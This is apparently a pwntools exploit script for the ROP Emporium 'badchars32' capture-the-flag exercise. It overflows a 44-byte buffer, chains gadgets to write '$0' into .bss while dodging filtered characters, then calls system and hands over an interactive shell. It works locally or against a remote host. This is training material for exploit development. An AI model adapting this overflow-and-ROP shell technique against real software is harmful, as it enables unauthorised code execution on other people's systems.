#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './badchars32'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# gadget
system = 0x80487b7
xbc = 0x8048890
pbc = 0x8048896
mds = 0x8048893
pds = 0x8048899

'''
   0x8048890 <usefulGadgets>: xor    BYTE PTR [ebx],cl
   0x8048892 <usefulGadgets+2>: ret    
   0x8048893 <usefulGadgets+3>: mov    DWORD PTR [edi],esi
   0x8048895 <usefulGadgets+5>: ret    
   0x8048896 <usefulGadgets+6>: pop    ebx
   0x8048897 <usefulGadgets+7>: pop    ecx
   0x8048898 <usefulGadgets+8>: ret    
   0x8048899 <usefulGadgets+9>: pop    esi
   0x804889a <usefulGadgets+10>:  pop    edi
   0x804889b <usefulGadgets+11>:  ret    
   0x804889c <usefulGadgets+12>:  xchg   ax,ax
   0x804889e <usefulGadgets+14>:  xchg   ax,ax
'''

# rop1
offset = 44
payload = 'A'*offset
# filtered: bic/ fns
# $0 is okay, but use gadget xbc to get /bin/sh via xor is the goal (too lazy to write exp) 
payload += p32(pds) + '$0\0\0' + p32(elf.bss()+0x400) + p32(mds) 
payload += p32(system) + p32(elf.bss()+0x400)

# debug()
sl(payload)

p.interactive()